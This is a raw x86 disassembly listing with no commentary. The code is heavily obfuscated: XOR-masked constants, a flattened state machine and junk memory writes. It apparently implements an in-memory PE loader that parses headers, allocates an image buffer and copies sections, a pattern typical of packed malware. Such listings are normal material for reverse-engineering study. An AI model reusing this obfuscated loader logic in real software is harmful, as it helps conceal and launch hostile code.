  4284c8:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  4284cf:	mov    edx,DWORD PTR [ebp-0x4]
  4284d2:	xor    ecx,edx
  4284d4:	mov    DWORD PTR [ebp-0x8],ecx
  4284d7:	mov    ecx,DWORD PTR [ebp-0xc]
  4284da:	xor    ecx,esi
  4284dc:	lea    eax,[eax+ecx*1+0x3272f1]
  4284e3:	mov    DWORD PTR [ebp+0x8],eax
  4284e6:	mov    eax,DWORD PTR [ebp-0xc]
  4284e9:	xor    eax,esi
  4284eb:	mov    ecx,0xffcd8d0f
  4284f0:	sub    ecx,eax
  4284f2:	add    ecx,DWORD PTR [ebp-0x10]
  4284f5:	mov    DWORD PTR [ebp-0x10],ecx
  4284f8:	mov    eax,DWORD PTR [ebp-0x14]
  4284fb:	mov    ecx,DWORD PTR [ebp-0x10]
  4284fe:	xor    eax,esi
  428500:	add    eax,edi
  428502:	cmp    ecx,eax
  428504:	jne    0x428497
  428506:	mov    eax,DWORD PTR [ebp-0x1c]
  428509:	mov    ecx,DWORD PTR [ebp-0x8]
  42850c:	xor    eax,esi
  42850e:	add    eax,edi
  428510:	pop    edi
  428511:	pop    esi
  428512:	xor    eax,ecx
  428514:	pop    ebx
  428515:	leave  
  428516:	ret    0x4
  428519:	push   ebp
  42851a:	mov    ebp,esp
  42851c:	mov    eax,DWORD PTR [ebp+0x1c]
  42851f:	mov    ecx,DWORD PTR [ebp+0x8]
  428522:	mov    edx,DWORD PTR [ebp+0x10]
  428525:	mov    eax,DWORD PTR [eax+0x190]
  42852b:	mov    eax,DWORD PTR [eax]
  42852d:	sub    esp,0x64
  428530:	push   ebx
  428531:	push   esi
  428532:	push   edi
  428533:	mov    edi,0x75108aa
  428538:	xor    ecx,edi
  42853a:	mov    ebx,0x3272f1
  42853f:	add    ecx,ebx
  428541:	cmp    ecx,edx
  428543:	jne    0x428554
  428545:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  42854f:	jmp    0x428a50
  428554:	mov    ecx,DWORD PTR [ebp+0x8]
  428557:	mov    esi,DWORD PTR [ebp+0x14]
  42855a:	mov    edx,DWORD PTR [esi]
  42855c:	xor    ecx,edi
  42855e:	add    ecx,ebx
  428560:	cmp    edx,ecx
  428562:	je     0x428a0b
  428568:	mov    ecx,DWORD PTR [ebp+0x1c]
  42856b:	mov    DWORD PTR [ebp-0x1c],eax
  42856e:	mov    DWORD PTR [ebp+0x1c],ecx
  428571:	mov    ecx,DWORD PTR [ebp+0x18]
  428574:	mov    eax,DWORD PTR [esi]
  428576:	mov    DWORD PTR [ebp-0x20],eax
  428579:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428580:	mov    edx,0xf89c85ba
  428585:	mov    DWORD PTR [ebp-0x8],edx
  428588:	mov    eax,DWORD PTR [ebp+0x1c]
  42858b:	mov    DWORD PTR [ebp+0x1c],eax
  42858e:	mov    eax,DWORD PTR [ebp+0x1c]
  428591:	mov    eax,DWORD PTR [eax+0x190]
  428597:	mov    eax,DWORD PTR [eax]
  428599:	mov    DWORD PTR [ebp-0x24],ecx
  42859c:	mov    ecx,DWORD PTR [ebp+0x1c]
  42859f:	mov    ecx,DWORD PTR [ecx+0x190]
  4285a5:	mov    ecx,DWORD PTR [ecx]
  4285a7:	add    ecx,DWORD PTR [eax+0x3c]
  4285aa:	mov    DWORD PTR [ebp+0x10],ecx
  4285ad:	mov    eax,DWORD PTR [ebp+0x8]
  4285b0:	xor    eax,edi
  4285b2:	add    eax,ebx
  4285b4:	mov    DWORD PTR [ebp-0x4],eax
  4285b7:	mov    eax,DWORD PTR [ebp+0x8]
  4285ba:	xor    eax,edi
  4285bc:	add    eax,ebx
  4285be:	mov    DWORD PTR [ebp+0x18],eax
  4285c1:	mov    eax,DWORD PTR [ebp+0x10]
  4285c4:	mov    eax,DWORD PTR [eax+0x50]
  4285c7:	sub    eax,0xc
  4285ca:	mov    DWORD PTR [ebp-0x28],eax
  4285cd:	mov    eax,DWORD PTR [ebp+0x10]
  4285d0:	mov    eax,DWORD PTR [eax+0x38]
  4285d3:	mov    ecx,DWORD PTR [ebp+0x10]
  4285d6:	dec    eax
  4285d7:	test   DWORD PTR [ecx+0x54],eax
  4285da:	mov    eax,DWORD PTR [ebp+0x10]
  4285dd:	je     0x4285f7
  4285df:	mov    eax,DWORD PTR [eax+0x38]
  4285e2:	mov    ecx,DWORD PTR [ebp+0x10]
  4285e5:	mov    ecx,DWORD PTR [ecx+0x54]
  4285e8:	dec    eax
  4285e9:	not    eax
  4285eb:	and    ecx,eax
  4285ed:	mov    eax,DWORD PTR [ebp+0x10]
  4285f0:	mov    eax,DWORD PTR [eax+0x38]
  4285f3:	add    eax,ecx
  4285f5:	jmp    0x4285fa
  4285f7:	mov    eax,DWORD PTR [eax+0x54]
  4285fa:	mov    DWORD PTR [ebp+0x1c],eax
  4285fd:	mov    eax,DWORD PTR [ebp+0x8]
  428600:	xor    eax,edi
  428602:	add    eax,ebx
  428604:	mov    DWORD PTR [ebp+0x18],eax
  428607:	mov    eax,DWORD PTR [ebp+0x8]
  42860a:	xor    eax,edi
  42860c:	add    eax,ebx
  42860e:	mov    DWORD PTR [ebp+0x18],eax
  428611:	mov    eax,DWORD PTR [ebp+0x8]
  428614:	mov    ecx,DWORD PTR [ebp-0x24]
  428617:	xor    eax,edi
  428619:	add    eax,ebx
  42861b:	mov    DWORD PTR [ecx],eax
  42861d:	mov    DWORD PTR [ebp+0x18],edx
  428620:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  428627:	mov    DWORD PTR [ebp+0x18],0xf89c85b8
  42862e:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  428635:	mov    eax,DWORD PTR [ebp-0x8]
  428638:	mov    ecx,DWORD PTR [ebp+0x1c]
  42863b:	xor    eax,edi
  42863d:	add    eax,ebx
  42863f:	imul   eax,ecx
  428642:	mov    ecx,DWORD PTR [ebp+0x8]
  428645:	mov    edx,DWORD PTR [ebp-0x28]
  428648:	xor    ecx,edi
  42864a:	lea    ecx,[ecx+edx*1+0x3272f1]
  428651:	cmp    eax,ecx
  428653:	jae    0x428a04
  428659:	mov    eax,DWORD PTR [ebp+0x8]
  42865c:	xor    eax,edi
  42865e:	add    eax,ebx
  428660:	mov    DWORD PTR [ebp+0x18],eax
  428663:	mov    eax,DWORD PTR [ebp+0x1c]
  428666:	add    eax,DWORD PTR [ebp-0x1c]
  428669:	mov    DWORD PTR [ebp-0x4],eax
  42866c:	push   DWORD PTR [ebp-0x4]
  42866f:	mov    esi,DWORD PTR [ebp-0x1c]
  428672:	mov    ecx,DWORD PTR [ebp+0x10]
  428675:	call   0x4277c9
  42867a:	mov    DWORD PTR [ebp+0xc],eax
  42867d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428684:	mov    eax,DWORD PTR [ebp-0x18]
  428687:	xor    eax,edi
  428689:	lea    ecx,[ebp-0x40]
  42868c:	add    eax,ebx
  42868e:	push   ecx
  42868f:	call   0x427d5b
  428694:	mov    eax,DWORD PTR [ebp+0xc]
  428697:	test   eax,eax
  428699:	je     0x4286e9
  42869b:	mov    eax,DWORD PTR [ebp-0x18]
  42869e:	xor    eax,edi
  4286a0:	add    eax,ebx
  4286a2:	push   eax
  4286a3:	push   DWORD PTR [ebp+0xc]
  4286a6:	lea    eax,[ebp-0x40]
  4286a9:	push   eax
  4286aa:	call   0x427c51
  4286af:	mov    eax,DWORD PTR [ebp-0x4]
  4286b2:	mov    DWORD PTR [ebp-0x18],eax
  4286b5:	mov    eax,DWORD PTR [ebp-0x18]
  4286b8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4286bb:	sub    eax,ecx
  4286bd:	mov    DWORD PTR [ebp-0x18],eax
  4286c0:	mov    eax,DWORD PTR [ebp+0xc]
  4286c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4286c6:	mov    eax,DWORD PTR [eax+0x10]
  4286c9:	add    eax,DWORD PTR [ecx+0xc]
  4286cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4286cf:	cmp    ecx,eax
  4286d1:	jb     0x4286e9
  4286d3:	mov    eax,DWORD PTR [ebp+0xc]
  4286d6:	mov    eax,DWORD PTR [eax+0xc]
  4286d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4286dc:	add    eax,DWORD PTR [ecx+0x8]
  4286df:	mov    ecx,DWORD PTR [ebp-0x18]
  4286e2:	sub    eax,ecx
  4286e4:	jmp    0x4289d7
  4286e9:	push   0xc
  4286eb:	push   DWORD PTR [ebp-0x4]
  4286ee:	lea    eax,[ebp-0x4c]
  4286f1:	push   eax
  4286f2:	call   0x427c51
  4286f7:	mov    eax,0xf89c85a5
  4286fc:	mov    DWORD PTR [ebp-0x2c],eax
  4286ff:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  428706:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  42870d:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  428714:	lea    ecx,[ebp-0x2c]
  428717:	mov    DWORD PTR [ebp-0xc],ecx
  42871a:	lea    ecx,[ebp-0x30]
  42871d:	mov    DWORD PTR [ebp-0x10],ecx
  428720:	lea    ecx,[ebp-0x34]
  428723:	mov    DWORD PTR [ebp+0xc],ecx
  428726:	lea    ecx,[ebp-0x38]
  428729:	mov    DWORD PTR [ebp-0x14],ecx
  42872c:	mov    ecx,DWORD PTR [ebp+0x8]
  42872f:	xor    ecx,edi
  428731:	add    ecx,ebx
  428733:	mov    DWORD PTR [ebp-0x18],ecx
  428736:	jmp    0x428932
  42873b:	cmp    eax,0xf89c85bb
  428740:	je     0x428944
  428746:	mov    ecx,DWORD PTR [ebp-0x8]
  428749:	xor    ecx,edi
  42874b:	mov    esi,eax
  42874d:	add    ecx,ebx
  42874f:	mov    DWORD PTR [ebp+0x18],ecx
  428752:	mov    eax,DWORD PTR [ebp-0x18]
  428755:	xor    esi,edi
  428757:	lea    eax,[eax+esi*1+0x3272f1]
  42875e:	mov    DWORD PTR [ebp-0x18],eax
  428761:	mov    eax,DWORD PTR [ebp-0x8]
  428764:	mov    ecx,DWORD PTR [ebp-0x18]
  428767:	xor    eax,edi
  428769:	add    eax,ebx
  42876b:	cmp    ecx,eax
  42876d:	jne    0x428782
  42876f:	mov    eax,DWORD PTR [ebp+0x8]
  428772:	xor    eax,edi
  428774:	add    eax,ebx
  428776:	push   eax
  428777:	push   0xc
  428779:	lea    eax,[ebp-0x4c]
  42877c:	push   eax
  42877d:	call   0x428236
  428782:	mov    eax,DWORD PTR [ebp-0xc]
  428785:	mov    eax,DWORD PTR [eax]
  428787:	xor    eax,edi
  428789:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428790:	mov    ecx,DWORD PTR [ebp+0x8]
  428793:	xor    ecx,edi
  428795:	movzx  eax,al
  428798:	add    ecx,ebx
  42879a:	cmp    eax,ecx
  42879c:	je     0x42891a
  4287a2:	mov    eax,DWORD PTR [ebp-0x10]
  4287a5:	mov    eax,DWORD PTR [eax]
  4287a7:	xor    eax,edi
  4287a9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287b0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287b3:	xor    ecx,edi
  4287b5:	movzx  eax,al
  4287b8:	add    ecx,ebx
  4287ba:	cmp    eax,ecx
  4287bc:	je     0x42891a
  4287c2:	mov    eax,DWORD PTR [ebp+0xc]
  4287c5:	mov    eax,DWORD PTR [eax]
  4287c7:	xor    eax,edi
  4287c9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287d3:	xor    ecx,edi
  4287d5:	movzx  eax,al
  4287d8:	add    ecx,ebx
  4287da:	cmp    eax,ecx
  4287dc:	je     0x42891a
  4287e2:	mov    eax,DWORD PTR [ebp-0x14]
  4287e5:	mov    eax,DWORD PTR [eax]
  4287e7:	xor    eax,edi
  4287e9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287f3:	xor    ecx,edi
  4287f5:	movzx  eax,al
  4287f8:	add    ecx,ebx
  4287fa:	cmp    eax,ecx
  4287fc:	je     0x42891a
  428802:	mov    eax,DWORD PTR [ebp-0x10]
  428805:	mov    eax,DWORD PTR [eax]
  428807:	xor    eax,edi
  428809:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428810:	mov    ecx,DWORD PTR [ebp-0xc]
  428813:	mov    ecx,DWORD PTR [ecx]
  428815:	xor    ecx,edi
  428817:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  42881e:	xor    al,cl
  428820:	mov    ecx,DWORD PTR [ebp+0xc]
  428823:	mov    ecx,DWORD PTR [ecx]
  428825:	xor    ecx,edi
  428827:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  42882e:	or     al,cl
  428830:	mov    ecx,DWORD PTR [ebp-0xc]
  428833:	mov    ecx,DWORD PTR [ecx]
  428835:	xor    ecx,edi
  428837:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  42883e:	cmp    cl,al
  428840:	jne    0x42891a
  428846:	mov    eax,DWORD PTR [ebp+0xc]
  428849:	mov    eax,DWORD PTR [eax]
  42884b:	xor    eax,edi
  42884d:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428854:	mov    ecx,DWORD PTR [ebp-0x10]
  428857:	mov    ecx,DWORD PTR [ecx]
  428859:	xor    ecx,edi
  42885b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428862:	xor    al,cl
  428864:	mov    ecx,DWORD PTR [ebp-0x14]
  428867:	mov    ecx,DWORD PTR [ecx]
  428869:	xor    ecx,edi
  42886b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428872:	or     al,cl
  428874:	mov    ecx,DWORD PTR [ebp-0x10]
  428877:	mov    ecx,DWORD PTR [ecx]
  428879:	xor    ecx,edi
  42887b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428882:	cmp    cl,al
  428884:	jne    0x42891a
  42888a:	mov    eax,DWORD PTR [ebp-0x14]
  42888d:	mov    eax,DWORD PTR [eax]
  42888f:	xor    eax,edi
  428891:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428898:	mov    ecx,DWORD PTR [ebp+0xc]
  42889b:	mov    ecx,DWORD PTR [ecx]
  42889d:	xor    ecx,edi
  42889f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288a6:	xor    al,cl
  4288a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4288ab:	mov    ecx,DWORD PTR [ecx]
  4288ad:	xor    ecx,edi
  4288af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288b6:	or     al,cl
  4288b8:	mov    ecx,DWORD PTR [ebp+0xc]
  4288bb:	mov    ecx,DWORD PTR [ecx]
  4288bd:	xor    ecx,edi
  4288bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4288c6:	cmp    cl,al
  4288c8:	jne    0x42891a
  4288ca:	mov    eax,DWORD PTR [ebp-0x14]
  4288cd:	mov    eax,DWORD PTR [eax]
  4288cf:	xor    eax,edi
  4288d1:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4288d8:	mov    ecx,DWORD PTR [ebp-0xc]
  4288db:	mov    ecx,DWORD PTR [ecx]
  4288dd:	xor    ecx,edi
  4288df:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288e6:	xor    al,cl
  4288e8:	mov    ecx,DWORD PTR [ebp-0x10]
  4288eb:	mov    ecx,DWORD PTR [ecx]
  4288ed:	xor    ecx,edi
  4288ef:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288f6:	or     al,cl
  4288f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4288fb:	mov    ecx,DWORD PTR [ecx]
  4288fd:	xor    ecx,edi
  4288ff:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428906:	cmp    cl,al
  428908:	jne    0x42891a
  42890a:	lea    eax,[ebp-0x4c]
  42890d:	push   eax
  42890e:	call   0x4283d5
  428913:	mov    ecx,DWORD PTR [ebp-0x44]
  428916:	cmp    eax,ecx
  428918:	je     0x428924
  42891a:	mov    eax,DWORD PTR [ebp+0x8]
  42891d:	xor    eax,edi
  42891f:	add    eax,ebx
  428921:	mov    DWORD PTR [ebp+0x18],eax
  428924:	mov    eax,DWORD PTR [ebp-0x8]
  428927:	xor    eax,edi
  428929:	lea    eax,[eax+esi*1+0x3272f1]
  428930:	xor    eax,edi
  428932:	mov    ecx,DWORD PTR [ebp+0x8]
  428935:	mov    edx,DWORD PTR [ebp+0x18]
  428938:	xor    ecx,edi
  42893a:	add    ecx,ebx
  42893c:	cmp    edx,ecx
  42893e:	je     0x42873b
  428944:	mov    eax,DWORD PTR [ebp+0x8]
  428947:	mov    ecx,DWORD PTR [ebp+0x18]
  42894a:	xor    eax,edi
  42894c:	add    eax,ebx
  42894e:	cmp    ecx,eax
  428950:	jne    0x428963
  428952:	mov    eax,DWORD PTR [ebp-0x8]
  428955:	mov    ecx,DWORD PTR [ebp+0x1c]
  428958:	xor    eax,edi
  42895a:	lea    eax,[eax+ecx*1+0x3272f1]
  428961:	jmp    0x4289da
  428963:	push   0x18
  428965:	push   DWORD PTR [ebp-0x4]
  428968:	lea    eax,[ebp-0x64]
  42896b:	push   eax
  42896c:	call   0x427c51
  428971:	mov    eax,DWORD PTR [ebp+0x8]
  428974:	mov    ecx,DWORD PTR [ebp-0x18]
  428977:	xor    eax,edi
  428979:	add    eax,ebx
  42897b:	cmp    eax,ecx
  42897d:	je     0x428992
  42897f:	mov    eax,DWORD PTR [ebp+0x8]
  428982:	xor    eax,edi
  428984:	add    eax,ebx
  428986:	push   eax
  428987:	push   0x18
  428989:	lea    eax,[ebp-0x64]
  42898c:	push   eax
  42898d:	call   0x428236
  428992:	mov    eax,DWORD PTR [ebp-0x4]
  428995:	add    eax,0x18
  428998:	mov    DWORD PTR [ebp+0x18],eax
  42899b:	push   DWORD PTR [ebp-0x50]
  42899e:	push   DWORD PTR [ebp+0x18]
  4289a1:	mov    eax,DWORD PTR [ebp-0x54]
  4289a4:	add    eax,DWORD PTR [ebp-0x20]
  4289a7:	push   eax
  4289a8:	call   0x427c51
  4289ad:	mov    eax,DWORD PTR [ebp+0x8]
  4289b0:	mov    ecx,DWORD PTR [ebp-0x18]
  4289b3:	xor    eax,edi
  4289b5:	add    eax,ebx
  4289b7:	cmp    eax,ecx
  4289b9:	je     0x4289cc
  4289bb:	push   0x0
  4289bd:	push   DWORD PTR [ebp-0x50]
  4289c0:	mov    eax,DWORD PTR [ebp-0x54]
  4289c3:	add    eax,DWORD PTR [ebp-0x20]
  4289c6:	push   eax
  4289c7:	call   0x428236
  4289cc:	mov    eax,DWORD PTR [ebp-0x24]
  4289cf:	mov    ecx,DWORD PTR [ebp-0x50]
  4289d2:	add    DWORD PTR [eax],ecx
  4289d4:	mov    eax,DWORD PTR [ebp-0x50]
  4289d7:	add    eax,DWORD PTR [ebp+0x1c]
  4289da:	mov    DWORD PTR [ebp+0x1c],eax
  4289dd:	mov    eax,DWORD PTR [ebp-0x8]
  4289e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4289e3:	xor    eax,edi
  4289e5:	add    eax,ebx
  4289e7:	imul   eax,ecx
  4289ea:	mov    ecx,DWORD PTR [ebp+0x8]
  4289ed:	mov    edx,DWORD PTR [ebp-0x28]
  4289f0:	xor    ecx,edi
  4289f2:	lea    ecx,[ecx+edx*1+0x3272f1]
  4289f9:	cmp    eax,ecx
  4289fb:	jb     0x428659
  428a01:	mov    esi,DWORD PTR [ebp+0x14]
  428a04:	mov    eax,DWORD PTR [ebp-0x20]
  428a07:	mov    DWORD PTR [esi],eax
  428a09:	jmp    0x428a50
  428a0b:	mov    ecx,DWORD PTR [ebp+0x8]
  428a0e:	mov    edx,DWORD PTR [ebp+0xc]
  428a11:	xor    ecx,edi
  428a13:	xor    edx,edi
  428a15:	add    ecx,ebx
  428a17:	add    edx,ebx
  428a19:	cmp    ecx,edx
  428a1b:	jne    0x428a2f
  428a1d:	mov    eax,ds:0x7f642ddc
  428a22:	imul   eax,eax,0x9f15fccf
  428a28:	mov    ds:0x7f642ddc,eax
  428a2d:	jmp    0x428a50
  428a2f:	mov    ecx,DWORD PTR [ebp+0x8]
  428a32:	xor    ecx,edi
  428a34:	add    ecx,ebx
  428a36:	cmp    eax,ecx
  428a38:	je     0x428a46
  428a3a:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  428a44:	jmp    0x428a50
  428a46:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  428a50:	pop    edi
  428a51:	pop    esi
  428a52:	pop    ebx
  428a53:	leave  
  428a54:	ret    0x18
  428a57:	push   ebp
  428a58:	mov    ebp,esp
  428a5a:	and    esp,0xfffffff8
  428a5d:	mov    eax,DWORD PTR [ebp+0x20]
  428a60:	sub    esp,0x14
  428a63:	push   ebx
  428a64:	mov    ebx,DWORD PTR [ebp+0x14]
  428a67:	push   esi
  428a68:	push   edi
  428a69:	cmp    eax,0xf89c85a5
  428a6e:	jne    0x428a7a
  428a70:	push   0xf89c85ba
  428a75:	jmp    0x428bac
  428a7a:	mov    eax,DWORD PTR [ebp+0x20]
  428a7d:	cmp    eax,0xf89c85ba
  428a82:	jne    0x428a8e
  428a84:	push   0xf89c85bb
  428a89:	jmp    0x428bac
  428a8e:	mov    eax,DWORD PTR [ebp+0x20]
  428a91:	cmp    eax,0xf89c85bb
  428a96:	jne    0x428aa2
  428a98:	push   0xf89c85b8
  428a9d:	jmp    0x428bac
  428aa2:	mov    eax,DWORD PTR [ebp+0x20]
  428aa5:	cmp    eax,0xf89c85b8
  428aaa:	jne    0x428ab6
  428aac:	push   0xf89c85b9
  428ab1:	jmp    0x428bac
  428ab6:	mov    ecx,DWORD PTR [ebp+0x20]
  428ab9:	mov    eax,0xf89c85bc
  428abe:	cmp    ecx,eax
  428ac0:	jne    0x428b7c
  428ac6:	mov    eax,DWORD PTR [ebp+0x10]
  428ac9:	mov    DWORD PTR [esp+0xc],eax
  428acd:	mov    eax,DWORD PTR [ebp+0x18]
  428ad0:	mov    DWORD PTR [esp+0x14],eax
  428ad4:	mov    eax,DWORD PTR [ebp+0xc]
  428ad7:	mov    DWORD PTR [esp+0x18],eax
  428adb:	mov    eax,DWORD PTR [ebp+0x8]
  428ade:	mov    DWORD PTR [esp+0x10],eax
  428ae2:	mov    eax,DWORD PTR [esp+0x10]
  428ae6:	mov    ecx,DWORD PTR [esp+0x14]
  428aea:	mov    edi,0x75108aa
  428aef:	xor    eax,edi
  428af1:	mov    esi,0x3272f1
  428af6:	add    eax,esi
  428af8:	mov    DWORD PTR [ecx],eax
  428afa:	mov    eax,DWORD PTR [esp+0xc]
  428afe:	mov    eax,DWORD PTR [eax+0x194]
  428b04:	mov    ecx,DWORD PTR [eax]
  428b06:	mov    eax,DWORD PTR [esp+0xc]
  428b0a:	mov    eax,DWORD PTR [eax+0x194]
  428b10:	mov    eax,DWORD PTR [eax]
  428b12:	add    eax,DWORD PTR [ecx+0x3c]
  428b15:	mov    ecx,DWORD PTR [esp+0xc]
  428b19:	mov    ecx,DWORD PTR [ecx+0x1e0]
  428b1f:	mov    ecx,DWORD PTR [ecx+0x14]
  428b22:	push   0x4
  428b24:	push   0x3000
  428b29:	push   DWORD PTR [eax+0x50]
  428b2c:	push   0x0
  428b2e:	call   ecx
  428b30:	mov    DWORD PTR [ebx],eax
  428b32:	mov    eax,DWORD PTR [esp+0x10]
  428b36:	push   DWORD PTR [esp+0xc]
  428b3a:	xor    eax,edi
  428b3c:	add    eax,esi
  428b3e:	mov    DWORD PTR [esp+0x20],eax
  428b42:	lea    eax,[esp+0x20]
  428b46:	push   eax
  428b47:	push   ebx
  428b48:	push   DWORD PTR [esp+0x20]
  428b4c:	push   DWORD PTR [esp+0x28]
  428b50:	push   DWORD PTR [esp+0x24]
  428b54:	call   0x428519
  428b59:	mov    eax,DWORD PTR [esp+0x10]
  428b5d:	mov    ecx,DWORD PTR [ebx]
  428b5f:	xor    eax,edi
  428b61:	add    eax,esi
  428b63:	cmp    ecx,eax
  428b65:	je     0x428bc3
  428b67:	mov    eax,DWORD PTR [esp+0x18]
  428b6b:	mov    ecx,DWORD PTR [esp+0x14]
  428b6f:	xor    eax,edi
  428b71:	add    eax,esi
  428b73:	imul   eax,DWORD PTR [esp+0x1c]
  428b78:	mov    DWORD PTR [ecx],eax
  428b7a:	jmp    0x428bc3
  428b7c:	mov    ecx,DWORD PTR [ebp+0x20]
  428b7f:	cmp    ecx,0xf89c85b9
  428b85:	jne    0x428b8e
  428b87:	push   0xf89c85be
  428b8c:	jmp    0x428bac
  428b8e:	mov    ecx,DWORD PTR [ebp+0x20]
  428b91:	cmp    ecx,0xf89c85be
  428b97:	jne    0x428ba0
  428b99:	push   0xf89c85bf
  428b9e:	jmp    0x428bac
  428ba0:	mov    ecx,DWORD PTR [ebp+0x20]
  428ba3:	cmp    ecx,0xf89c85bf
  428ba9:	jne    0x428bc3
  428bab:	push   eax
  428bac:	push   DWORD PTR [ebp+0x1c]
  428baf:	push   DWORD PTR [ebp+0x18]
  428bb2:	push   ebx
  428bb3:	push   DWORD PTR [ebp+0x10]
  428bb6:	push   DWORD PTR [ebp+0xc]
  428bb9:	push   DWORD PTR [ebp+0x8]
  428bbc:	call   0x428a57
  428bc1:	mov    DWORD PTR [ebx],eax
  428bc3:	mov    eax,DWORD PTR [ebx]
  428bc5:	pop    edi
  428bc6:	pop    esi
  428bc7:	pop    ebx
  428bc8:	mov    esp,ebp
  428bca:	pop    ebp
  428bcb:	ret    0x1c
  428bce:	push   ebp
  428bcf:	mov    ebp,esp
  428bd1:	sub    esp,0xc
  428bd4:	mov    eax,0xf89c85a5
  428bd9:	mov    DWORD PTR [ebp-0x8],eax
  428bdc:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  428be3:	mov    ecx,DWORD PTR [ebp-0x8]
  428be6:	xor    ecx,0x75108aa
  428bec:	add    ecx,0x3272f1
  428bf2:	mov    DWORD PTR [ebp-0x4],ecx
  428bf5:	mov    ecx,DWORD PTR [ebp+0xc]
  428bf8:	push   eax
  428bf9:	mov    DWORD PTR [ebp+0xc],ecx
  428bfc:	push   DWORD PTR [ebp+0xc]
  428bff:	lea    eax,[ebp-0x4]
  428c02:	push   DWORD PTR [ebp+0x8]
  428c05:	push   eax
  428c06:	push   DWORD PTR [ebp+0xc]
  428c09:	push   DWORD PTR [ebp-0xc]
  428c0c:	push   DWORD PTR [ebp-0x8]
  428c0f:	call   0x428a57
  428c14:	mov    DWORD PTR [ebp-0x4],eax
  428c17:	mov    eax,DWORD PTR [ebp-0x4]
  428c1a:	leave  
  428c1b:	ret    0x8
